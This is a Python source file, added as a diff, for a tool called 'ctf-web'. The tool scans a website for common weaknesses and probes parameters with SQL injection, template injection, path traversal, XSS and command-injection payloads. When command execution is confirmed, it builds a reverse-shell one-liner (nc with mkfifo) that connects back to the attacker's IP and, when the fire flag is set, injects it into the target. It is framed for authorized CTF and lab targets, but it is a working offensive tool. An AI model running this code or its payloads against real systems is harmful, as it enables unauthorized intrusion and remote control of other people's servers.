@@ -1,0 +1,675 @@
+#!/usr/bin/env python3
+"""ctf-web — web-target triage: run all the basic checks on a website, then pop a
+reverse shell when an RCE is confirmed. The `ctf-file` of web challenges.
+
+Interactive by default (a small menu). Pass --auto for a straight, non-interactive
+run (also auto-selected when stdin isn't a TTY, e.g. when ctf-eval drives it).
+
+Always confirms your attacker IP (LHOST) before acting; it persists in
+~/.config/ctf-toolkit/ctf-web.json until you change it.
+
+Writes a <host>-work/ folder (report + per-tool artifacts + findings.json) using the
+SAME contract as ctf-file, so `ctf-eval http://target` puts an AI verdict on it.
+
+Checks (each skips cleanly if the tool is missing / times out / errors):
+  • reachability, final URL, status, title, security headers, cookies
+  • fingerprint: whatweb, httpx, wafw00f (WAF)
+  • sensitive files: robots, .git/, .env, backups, server-status, phpinfo, admin, …
+  • content discovery: ffuf / gobuster / feroxbuster (small list, timeboxed; --deep = bigger)
+  • vuln scan: nuclei, nikto (--deep)
+  • param discovery (arjun) + quick probes: SQLi, SSTI, LFI, reflected-XSS, cmd-injection
+  • RCE → reverse shell: on a confirmed command-injection, generate a payload (via ctf-rev)
+    to your LHOST and, with --rev PORT --fire, send it
+
+Usage:
+    ctf-web                                     # interactive menu (asks for LHOST first)
+    ctf-web http://10.10.10.10 --auto           # non-interactive recon
+    ctf-web http://site/?id=1 --auto --deep     # bigger wordlists + nikto/nuclei
+    ctf-web http://site --rev 4444 --fire --auto # send the exploit (listener must be up)
+    ctf-web --lhost 10.10.14.3 http://site --auto
+
+Safe by default: no exploit is fired unless --rev is given; --fire is required to send it.
+Intended for authorized CTF / lab targets.
+"""
+import os, sys, re, json, ssl, shutil, socket, subprocess, urllib.request, urllib.error, urllib.parse
+from datetime import datetime, timezone
+
+TTY = sys.stdout.isatty()
+UA  = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
+       "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+_SSL = ssl.create_default_context()
+_SSL.check_hostname = False
+_SSL.verify_mode = ssl.CERT_NONE
+
+CONF = os.path.expanduser("~/.config/ctf-toolkit/ctf-web.json")
+# Flag-shaped token. The inner class excludes whitespace and code punctuation
+# ({}()<>;=&|,'") so minified JS like `try{...}` / `else{var a,b}` can't false-positive,
+# while real flags (THM{...}, flag{a-b.c_1}) still match.
+FLAG_RE = re.compile(r"\b[A-Za-z0-9_]{2,12}\{[^\s{}()<>;=&|,'\"]{2,120}\}")
+
+# report buffer — everything appended here is both printed and written to triage-report.txt
+_REPORT: list[str] = []
+_FINDINGS: list[dict] = []
+
+
+def c(code, s):
+    return f"\033[{code}m{s}\033[0m" if TTY else s
+
+
+def eprint(*a):
+    print(*a, file=sys.stderr, flush=True)
+
+
+def say(line=""):
+    """Append a line to the report and echo to stdout (ctf-eval captures stdout)."""
+    _REPORT.append(line)
+    print(line)
+
+
+def section(title):
+    say("")
+    say(c("36;1", f"== {title} ==") if TTY else f"== {title} ==")
+
+
+def finding(sev, name, detail):
+    """sev: HIGH|MED|LOW|INFO. Recorded to findings.json and printed in the report."""
+    _FINDINGS.append({"severity": sev, "name": name, "detail": detail})
+    col = {"HIGH": "31;1", "MED": "33", "LOW": "36", "INFO": "90"}.get(sev, "0")
+    say(f"  [{c(col, sev):<4}] {name}: {detail}")
+
+
+def now_iso():
+    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
+
+
+# ── LHOST (attacker IP) — persisted, always confirmed before acting ──────────
+def detect_lhost():
+    """Best-effort local IP: tun0 (VPN) first, then the default-route source."""
+    try:
+        out = subprocess.run(["ip", "-4", "-o", "addr", "show", "tun0"],
+                             capture_output=True, text=True, timeout=4).stdout
+        for tok in out.split():
+            if "/" in tok and tok.split("/")[0].count(".") == 3:
+                return tok.split("/")[0]
+    except Exception:
+        pass
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
+        return ip
+    except Exception:
+        return "127.0.0.1"
+
+
+def load_lhost():
+    try:
+        with open(CONF) as f:
+            return json.load(f).get("lhost") or None
+    except Exception:
+        return None
+
+
+def save_lhost(ip):
+    try:
+        os.makedirs(os.path.dirname(CONF), exist_ok=True)
+        with open(CONF, "w") as f:
+            json.dump({"lhost": ip}, f)
+    except OSError as e:
+        eprint(f"[ctf-web] could not persist LHOST: {e}")
+
+
+def _local_ips():
+    try:
+        out = subprocess.run(["ip", "-4", "-o", "addr"], capture_output=True, text=True, timeout=4).stdout
+        return set(re.findall(r"inet (\d+\.\d+\.\d+\.\d+)", out))
+    except Exception:
+        return set()
+
+
+def resolve_lhost(interactive, override=None):
+    """Resolve the attacker IP. Precedence: --lhost/env override > persisted > auto-detect.
+    In interactive mode, always prompt (prefilled) and persist the choice. In auto mode,
+    self-heal a persisted IP that's no longer on any interface (e.g. the VPN reconnected
+    with a new address) by falling back to auto-detect."""
+    ip = override or os.environ.get("CTF_LHOST") or load_lhost() or detect_lhost()
+    if interactive:
+        try:
+            ans = input(c("36", f"  attacker IP (LHOST) [{ip}]: ")).strip()
+        except (EOFError, KeyboardInterrupt):
+            ans = ""
+        if ans:
+            ip = ans
+        save_lhost(ip)
+        return ip
+    if not override and ip not in _local_ips():
+        alt = detect_lhost()
+        if alt in _local_ips():
+            if load_lhost():
+                eprint(f"[ctf-web] persisted LHOST {ip} is not on any live interface — using {alt}")
+            ip = alt
+    if override or load_lhost() != ip:
+        save_lhost(ip)
+    return ip
+
+
+def normalize(url):
+    return url if "://" in url else "http://" + url
+
+
+def target_name(url):
+    p = urllib.parse.urlparse(url if "://" in url else "http://" + url)
+    host = p.hostname or "target"
+    name = host + (f"_{p.port}" if p.port else "")
+    return re.sub(r"[^A-Za-z0-9._-]", "_", name)
+
+
+# ── HTTP ─────────────────────────────────────────────────────────────────────
+def http(url, method="GET", data=None, headers=None, timeout=12):
+    """Return (status, headers_dict, body_str, final_url). status<0 on transport error."""
+    h = {"User-Agent": UA}
+    if headers:
+        h.update(headers)
+    req = urllib.request.Request(url, data=data, headers=h, method=method)
+    try:
+        with urllib.request.urlopen(req, timeout=timeout, context=_SSL) as r:
+            body = r.read(200_000).decode("utf-8", "replace")
+            return r.status, dict(r.headers), body, r.geturl()
+    except urllib.error.HTTPError as e:
+        body = ""
+        try:
+            body = e.read(200_000).decode("utf-8", "replace")
+        except Exception:
+            pass
+        return e.code, dict(e.headers or {}), body, url
+    except Exception as e:
+        return -1, {}, f"[error] {e}", url
+
+
+def run(cmd, timeout=120):
+    """Run an external tool, return (ok, output). ok=False if the binary is missing."""
+    if not shutil.which(cmd[0]):
+        return False, f"[skipped] {cmd[0]} not installed"
+    try:
+        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+        return True, (p.stdout + p.stderr).strip()
+    except subprocess.TimeoutExpired:
+        return True, f"[timed out after {timeout}s]"
+    except Exception as e:
+        return True, f"[error] {e}"
+
+
+def save(work, name, text):
+    try:
+        with open(os.path.join(work, name), "w", encoding="utf-8", errors="replace") as f:
+            f.write(text if text.endswith("\n") else text + "\n")
+    except OSError as e:
+        eprint(f"[ctf-web] could not write {name}: {e}")
+
+
+# ── checks ───────────────────────────────────────────────────────────────────
+SEC_HEADERS = ["content-security-policy", "strict-transport-security", "x-frame-options",
+               "x-content-type-options", "referrer-policy", "permissions-policy"]
+
+SENSITIVE = ["/robots.txt", "/sitemap.xml", "/.git/HEAD", "/.env", "/.htaccess",
+             "/server-status", "/phpinfo.php", "/info.php", "/.svn/entries",
+             "/backup.zip", "/backup.tar.gz", "/config.php.bak", "/.DS_Store",
+             "/admin/", "/administrator/", "/.well-known/security.txt", "/wp-login.php",
+             "/api/", "/swagger.json", "/actuator/health", "/debug"]
+
+COMMON_PARAMS = ["id", "page", "file", "path", "cmd", "q", "search", "name", "user",
+                 "url", "redirect", "include", "template", "view", "lang"]
+
+
+def check_reachability(url, work):
+    section("REACHABILITY & RESPONSE")
+    status, hdrs, body, final = http(url)
+    if status < 0:
+        finding("INFO", "unreachable", f"{url} — {body}")
+        return None
+    title = ""
+    m = re.search(r"<title[^>]*>(.*?)</title>", body, re.I | re.S)
+    if m:
+        title = m.group(1).strip()[:120]
+    say(f"  url        : {url}")
+    if final != url:
+        say(f"  final url  : {final}")
+    say(f"  status     : {status}")
+    say(f"  server     : {hdrs.get('Server', '?')}")
+    if hdrs.get("X-Powered-By"):
+        say(f"  powered-by : {hdrs['X-Powered-By']}")
+    if title:
+        say(f"  title      : {title}")
+    save(work, "headers.txt",
+         f"{status} {final}\n" + "\n".join(f"{k}: {v}" for k, v in hdrs.items()))
+    for fl in set(FLAG_RE.findall(body)):
+        finding("HIGH", "flag in response body", fl)
+    return {"status": status, "headers": hdrs, "body": body, "final": final}
+
+
+def check_security_headers(resp):
+    section("SECURITY HEADERS")
+    hdrs = {k.lower(): v for k, v in resp["headers"].items()}
+    missing = [h for h in SEC_HEADERS if h not in hdrs]
+    for h in SEC_HEADERS:
+        say(f"  {'ok ' if h in hdrs else 'MISS'} {h}")
+    if missing:
+        finding("LOW", "missing security headers", ", ".join(missing))
+    cookies = resp["headers"].get("Set-Cookie", "")
+    if cookies:
+        flags = []
+        if "httponly" not in cookies.lower(): flags.append("no HttpOnly")
+        if "secure" not in cookies.lower():   flags.append("no Secure")
+        if flags:
+            finding("LOW", "cookie flags", "; ".join(flags))
+
+
+def _first_line(s):
+    return next((l for l in s.splitlines() if l.strip()), "")
+
+
+def check_fingerprint(url, work):
+    section("FINGERPRINT")
+    ok, out = run(["whatweb", "-a", "3", "--no-errors", url], timeout=60)
+    save(work, "whatweb.txt", out) if ok else None
+    say(f"  whatweb : {_first_line(out)[:160] if ok else out}")
+
+    # ProjectDiscovery httpx. On Kali its binary is often `httpx-toolkit`; the bare `httpx`
+    # name may be the unrelated python HTTP library, which just prints a usage error.
+    hx = shutil.which("httpx-toolkit") or shutil.which("httpx")
+    if not hx:
+        say("  httpx    : (not installed)")
+    else:
+        ok, out = run([hx, "-silent", "-td", "-title", "-status-code", "-u", url], timeout=60)
+        if "Usage:" in out or "[OPTIONS]" in out:
+            say("  httpx    : (skipped — this 'httpx' is the python lib, not ProjectDiscovery httpx)")
+        else:
+            save(work, "httpx.txt", out)
+            say(f"  httpx    : {_first_line(out)[:160]}")
+
+    # wafw00f — report its verdict line, not the ASCII-art banner.
+    ok, out = run(["wafw00f", url], timeout=60)
+    if ok:
+        save(work, "wafw00f.txt", out)
+        verdict = next((l.strip() for l in out.splitlines()
+                        if re.search(r"is behind|seems to be behind|No WAF|is not behind", l, re.I)), "")
+        say(f"  wafw00f  : {verdict[:160] or '(no clear verdict)'}")
+        if re.search(r"is behind|seems to be behind", out, re.I):
+            finding("INFO", "WAF detected", verdict[:120])
+    else:
+        say(f"  wafw00f  : {out}")
+
+
+def check_sensitive(url, work):
+    section("SENSITIVE FILES / PATHS")
+    base = url.rstrip("/")
+    hits = []
+    for path in SENSITIVE:
+        status, hdrs, body, _ = http(base + path, timeout=8)
+        if status in (200, 401, 403) and not (status == 200 and "not found" in body.lower()):
+            tag = {200: "HIGH", 401: "LOW", 403: "LOW"}.get(status, "LOW")
+            note = f"{status}"
+            if path == "/.git/HEAD" and "ref:" in body:
+                note += " — exposed .git! (git-dumper)"; tag = "HIGH"
+            if path == "/.env" and re.search(r"=|APP_KEY|SECRET", body):
+                note += " — env secrets exposed"; tag = "HIGH"
+            hits.append(f"{path} [{note}]")
+            finding(tag, "reachable path", f"{path} ({note})")
+            for fl in set(FLAG_RE.findall(body)):
+                finding("HIGH", f"flag in {path}", fl)
+    if not hits:
+        say("  (none of the common sensitive paths responded)")
+    save(work, "sensitive.txt", "\n".join(hits) or "none")
+
+
+def check_discovery(url, work, deep):
+    section("CONTENT DISCOVERY")
+    wl = _wordlist()
+    if not wl:
+        say("  (no wordlist found — install seclists/dirb; skipping)")
+        return
+    fuzz = url.rstrip("/") + "/FUZZ"
+    if shutil.which("ffuf"):
+        out_json = os.path.join(work, "ffuf.json")
+        cmd = ["ffuf", "-u", fuzz, "-w", wl, "-mc", "200,204,301,302,307,401,403",
+               "-t", "40", "-o", out_json, "-of", "json", "-s"]
+        if not deep:
+            cmd += ["-maxtime", "45"]
+        run(cmd, timeout=(600 if deep else 90))
+        _report_ffuf(out_json)
+    elif shutil.which("feroxbuster"):
+        ok, out = run(["feroxbuster", "-u", url, "-w", wl, "-q", "-d", "1",
+                       "-o", os.path.join(work, "dirs.txt")], timeout=(600 if deep else 90))
+        say(f"  feroxbuster: {'done' if ok else out}")
+    elif shutil.which("gobuster"):
+        ok, out = run(["gobuster", "dir", "-u", url, "-w", wl, "-q", "-t", "40",
+                       "-o", os.path.join(work, "dirs.txt")], timeout=(600 if deep else 90))
+        say(f"  gobuster  : {'done' if ok else out}")
+    else:
+        say("  (ffuf/feroxbuster/gobuster not installed — skipping)")
+
+
+def _report_ffuf(path):
+    try:
+        with open(path) as f:
+            results = json.load(f).get("results", [])
+    except Exception:
+        say("  ffuf     : (no results)")
+        return
+    say(f"  ffuf     : {len(results)} path(s)")
+    for r in results[:25]:
+        say(f"    {r.get('status'):>3}  {r.get('url')}")
+        if r.get("status") == 200:
+            finding("LOW", "discovered path", r.get("url", ""))
+
+
+def check_vulns(url, work, deep):
+    section("VULN SCAN")
+    if shutil.which("nuclei"):
+        cmd = ["nuclei", "-u", url, "-silent", "-nc"]
+        if not deep:
+            cmd += ["-severity", "medium,high,critical", "-timeout", "5"]
+        ok, out = run(cmd, timeout=(900 if deep else 180))
+        save(work, "nuclei.txt", out)
+        n = 0
+        for line in out.splitlines():
+            if line.strip().startswith("["):
+                n += 1
+                sev = "HIGH" if re.search(r"critical|high", line, re.I) else "MED"
+                finding(sev, "nuclei", line.strip()[:160])
+        if not n:
+            say("  nuclei   : no templates matched")
+    else:
+        say("  nuclei   : (not installed)")
+    if deep and shutil.which("nikto"):
+        ok, out = run(["nikto", "-h", url, "-maxtime", "120", "-nointeractive"], timeout=200)
+        save(work, "nikto.txt", out)
+        say("  nikto    : saved to nikto.txt")
+
+
+def check_injection(url, work, rev_port, fire, lhost):
+    """Quick, non-destructive probes for the common injectable bug classes.
+    On a confirmed command-injection, optionally wire a reverse shell to LHOST."""
+    section("INJECTION PROBES")
+    params = _params_to_test(url, work)
+    if not params:
+        say("  (no parameters to probe — try a URL with ?param=value, or arjun found none)")
+        return
+    say(f"  testing params: {', '.join(p for _, p in params)}")
+    rce_vector = None
+    for base_url, param in params:
+        if _reflect_check(base_url, param, "'", [r"SQL syntax", r"mysql_fetch", r"ORA-\d+",
+                                                 r"unclosed quotation", r"SQLite3::"]):
+            finding("HIGH", "SQL injection (error-based)", f"{param}=' triggered a SQL error")
+        # distinctive product (1337*1337=1787569) so an incidental number can't false-positive;
+        # covers {{ }} (Jinja/Twig) and ${ } (Freemarker/EL) engines.
+        if (_reflect_check(base_url, param, "{{1337*1337}}", [r"\b1787569\b"]) or
+                _reflect_check(base_url, param, "${1337*1337}", [r"\b1787569\b"])):
+            finding("HIGH", "SSTI", f"{param} evaluated 1337*1337=1787569 (try SSTImap)")
+        if _reflect_check(base_url, param, "../../../../../../etc/passwd", [r"root:.*:0:0:"]):
+            finding("HIGH", "LFI / path traversal", f"{param} leaked /etc/passwd")
+        marker = "cwx9z1<b>"
+        if _reflect_check(base_url, param, marker, [re.escape(marker)]):
+            finding("MED", "reflected input (XSS candidate)", f"{param} reflects unencoded HTML")
+        for sep in [";id", "|id", "$(id)", "`id`", "\nid"]:   # \n → %0A once via urlencode
+            if _reflect_check(base_url, param, sep, [r"uid=\d+.*gid=\d+"]):
+                finding("HIGH", "command injection (RCE)", f"{param}={sep} returned `id` output")
+                rce_vector = (base_url, param)
+                break
+        if rce_vector:
+            break
+
+    if rce_vector and rev_port:
+        _do_revshell(rce_vector, rev_port, fire, work, lhost)
+    elif rce_vector:
+        b, p = rce_vector
+        say("")
+        say(c("31;1", "  RCE CONFIRMED — to pop a shell:"))
+        say(f"    1) ctf-rev listen 4444           # terminal A")
+        say(f"    2) re-run with:  --rev 4444 --fire")
+
+
+def _params_to_test(url, work):
+    """(base_url, param) pairs from existing query params, arjun, then common fallbacks."""
+    out, seen = [], set()
+    parsed = urllib.parse.urlparse(url)
+    for k in urllib.parse.parse_qs(parsed.query):
+        if k not in seen:
+            seen.add(k); out.append((url, k))
+    if shutil.which("arjun") and not out:
+        aout = os.path.join(work, "arjun.json")
+        run(["arjun", "-u", url, "-oJ", aout, "-q"], timeout=120)
+        try:
+            with open(aout) as f:
+                data = json.load(f)
+            for entry in (data.values() if isinstance(data, dict) else []):
+                for k in (entry.get("params") or []):
+                    if k not in seen:
+                        seen.add(k); out.append((url, k))
+        except Exception:
+            pass
+    if not out:
+        base = url.split("?")[0]
+        for k in COMMON_PARAMS[:6]:
+            out.append((base, k))
+    return out[:10]
+
+
+def _reflect_check(base_url, param, payload, signatures):
+    """Send base_url with param=payload; True if any signature matches the response body."""
+    parsed = urllib.parse.urlparse(base_url)
+    q = urllib.parse.parse_qs(parsed.query)
+    q[param] = [payload]
+    test = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(q, doseq=True)))
+    _, _, body, _ = http(test, timeout=10)
+    return any(re.search(sig, body, re.I) for sig in signatures)
+
+
+def _do_revshell(vector, port, fire, work, lhost):
+    base_url, param = vector
+    ctf_rev = shutil.which("ctf-rev") or os.path.expanduser("~/ctf-toolkit/bin/ctf-rev")
+    # Delivering through a URL param → the target runs it under /bin/sh, and a bash
+    # `>& /dev/tcp` one-liner does NOT survive that (dash has no /dev/tcp). Use the
+    # POSIX nc-mkfifo payload. Keep it RAW here — _reflect_check URL-encodes on send.
+    payload = None
+    if os.path.exists(ctf_rev):
+        try:
+            payload = subprocess.run([ctf_rev, "gen", "nc-mkfifo", lhost, str(port)],
+                                     capture_output=True, text=True, timeout=10).stdout.strip()
+        except Exception:
+            payload = None
+    if not payload:
+        payload = f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {lhost} {port} >/tmp/f"
+    say("")
+    say(c("31;1", f"  REVERSE SHELL prepared → {lhost}:{port}  (param: {param})"))
+    say(f"    payload : {payload}")
+    say(c("2", "    (nc-mkfifo, POSIX sh — survives a web /bin/sh context; URL-encoded on send)"))
+    save(work, "revshell.txt",
+         f"lhost={lhost} port={port} param={param}\npayload (raw):\n{payload}\n"
+         f"# inject with a leading ';' and URL-encode it (ctf-rev gen --for-web {port} does this)\n")
+    finding("HIGH", "reverse shell staged", f"cmd-injection on {param} → {lhost}:{port}")
+    if not fire:
+        say(c("33", f"    (not fired — start `ctf-rev listen {port}`, then add --fire)"))
+        say(c("2", f"    manual inject: URL-encode `;{payload}` into {param}  (or: ctf-rev gen --for-web {port})"))
+        return
+    say(c("33", f"    firing … make sure `ctf-rev listen {port}` is running on {lhost}"))
+    _reflect_check(base_url, param, ";" + payload, [r"$^"])   # inject; response usually empty/hangs
+    say("    injection sent — check your listener")
+
+
+def _wordlist():
+    for p in ["/usr/share/seclists/Discovery/Web-Content/common.txt",
+              "/usr/share/wordlists/dirb/common.txt",
+              "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"]:
+        if os.path.isfile(p):
+            return p
+    return None
+
+
+# ── scan driver (resilient: one failing check never loses the report) ────────
+def _safe(fn, *args):
+    try:
+        return fn(*args)
+    except Exception as e:
+        say(f"  [check error] {fn.__name__}: {e}")
+        return None
+
+
+def run_scan(url, deep, rev_port, fire, work, lhost):
+    url = normalize(url)
+    name = target_name(url)
+    work = work or f"{name}-work"
+    os.makedirs(work, exist_ok=True)
+    say(c("1;36", f"ctf-web — {url}"))
+    say(f"  target dir : {work}/")
+    say(f"  LHOST      : {lhost}")
+    say(f"  started    : {now_iso()}")
+
+    resp = _safe(check_reachability, url, work)
+    if resp is None:
+        _finalize(url, name, work)
+        return 2
+    _safe(check_security_headers, resp)
+    _safe(check_fingerprint, url, work)
+    _safe(check_sensitive, url, work)
+    _safe(check_discovery, url, work, deep)
+    _safe(check_vulns, url, work, deep)
+    _safe(check_injection, url, work, rev_port, fire, lhost)
+    _finalize(url, name, work)
+    return 0
+
+
+def _finalize(url, name, work):
+    section("FINDINGS SUMMARY")
+    if not _FINDINGS:
+        say("  no notable findings — try --deep, or add ?param=value for injection probes")
+    order = {"HIGH": 0, "MED": 1, "LOW": 2, "INFO": 3}
+    for f in sorted(_FINDINGS, key=lambda x: order.get(x["severity"], 9)):
+        col = {"HIGH": "31;1", "MED": "33", "LOW": "36", "INFO": "90"}.get(f["severity"], "0")
+        say(f"  [{c(col, f['severity']):<4}] {f['name']}: {f['detail']}")
+    save(work, "triage-report.txt", "\n".join(_strip_ansi(l) for l in _REPORT))
+    try:
+        with open(os.path.join(work, "findings.json"), "w") as fp:
+            json.dump({"tool": "ctf-web", "target": url, "timestamp": now_iso(),
+                       "findings": _FINDINGS}, fp, indent=2)
+    except OSError:
+        pass
+    eprint(f"[ctf-web] report + findings written to {work}/")
+
+
+def _strip_ansi(s):
+    return re.sub(r"\033\[[0-9;]*m", "", s)
+
+
+# ── interactive UI ────────────────────────────────────────────────────────────
+def menu(opts):
+    print(c("1;36", "\n  ctf-web — website triage + reverse shell"))
+    # Always confirm the attacker IP before any action; it persists until changed.
+    opts["lhost"] = resolve_lhost(interactive=True, override=opts.get("lhost_override"))
+    while True:
+        print()
+        print(f"  target   : {c('33', opts['url'] or '(unset)')}")
+        print(f"  LHOST    : {c('32', opts['lhost'])}   (persisted)")
+        print(f"  options  : deep={c('33','on' if opts['deep'] else 'off')}   "
+              f"rev-port={c('33', str(opts['rev_port']) if opts['rev_port'] else 'off')}   "
+              f"fire={c('33','on' if opts['fire'] else 'off')}")
+        print()
+        print("  [t] set target url        [i] change LHOST")
+        print("  [d] toggle deep scan      [p] set reverse-shell port")
+        print("  [f] toggle fire-exploit   [r] RUN recon")
+        print("  [e] run recon + AI eval (ctf-eval)")
+        print("  [q] quit")
+        try:
+            ch = input(c("36", "  > ")).strip().lower()
+        except (EOFError, KeyboardInterrupt):
+            print(); return
+        if ch == "t":
+            opts["url"] = input(c("36", "  target url> ")).strip() or opts["url"]
+        elif ch == "i":
+            opts["lhost"] = resolve_lhost(interactive=True)
+        elif ch == "d":
+            opts["deep"] = not opts["deep"]
+        elif ch == "p":
+            v = input(c("36", "  reverse-shell port> ")).strip()
+            opts["rev_port"] = int(v) if v.isdigit() else None
+        elif ch == "f":
+            opts["fire"] = not opts["fire"]
+        elif ch == "r":
+            if not _need_url(opts):
+                continue
+            _reset_report()
+            run_scan(opts["url"], opts["deep"], opts["rev_port"], opts["fire"], None, opts["lhost"])
+        elif ch == "e":
+            if not _need_url(opts):
+                continue
+            ev = shutil.which("ctf-eval") or os.path.expanduser("~/ctf-toolkit/bin/ctf-eval")
+            subprocess.call([ev, normalize(opts["url"])])
+        elif ch in ("q", "quit", "exit", ""):
+            return
+
+
+def _need_url(opts):
+    if not opts["url"]:
+        print(c("31", "  set a target url first ([t])"))
+        return False
+    return True
+
+
+def _reset_report():
+    _REPORT.clear(); _FINDINGS.clear()
+
+
+# ── args + main ───────────────────────────────────────────────────────────────
+def parse_args(argv):
+    o = {"url": None, "deep": False, "rev_port": None, "fire": False, "work": None,
+         "auto": False, "lhost_override": None}
+    i = 0
+    while i < len(argv):
+        a = argv[i]
+        if a in ("-h", "--help"):
+            print(__doc__); sys.exit(0)
+        elif a in ("--auto", "-y", "--no-ui"):
+            o["auto"] = True
+        elif a == "--deep":
+            o["deep"] = True
+        elif a == "--fire":
+            o["fire"] = True
+        elif a in ("--rev", "--work", "--lhost"):
+            if i + 1 >= len(argv):
+                eprint(f"[ctf-web] {a} needs a value"); sys.exit(2)
+            i += 1; val = argv[i]
+            if a == "--rev":
+                if not val.isdigit():
+                    eprint(f"[ctf-web] --rev needs a numeric port, got {val!r}"); sys.exit(2)
+                o["rev_port"] = int(val)
+            elif a == "--work":
+                o["work"] = val
+            else:
+                o["lhost_override"] = val
+        elif a.startswith("-"):
+            eprint(f"[ctf-web] unknown option {a}"); sys.exit(2)
+        elif o["url"] is None:
+            o["url"] = a
+        i += 1
+    return o
+
+
+def main():
+    o = parse_args(sys.argv[1:])
+    # UI by default; --auto (or a non-TTY caller like ctf-eval) runs straight through.
+    interactive = not o["auto"] and sys.stdin.isatty() and sys.stdout.isatty()
+    if interactive:
+        o["lhost"] = None
+        menu(o)
+        return
+    lhost = resolve_lhost(interactive=False, override=o["lhost_override"])
+    if not o["url"]:
+        eprint("usage: ctf-web <url> --auto [--deep] [--rev PORT [--fire]] [--lhost IP]"); sys.exit(1)
+    sys.exit(run_scan(o["url"], o["deep"], o["rev_port"], o["fire"], o["work"], lhost))
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        eprint("\n[ctf-web] interrupted")
+        sys.exit(130)
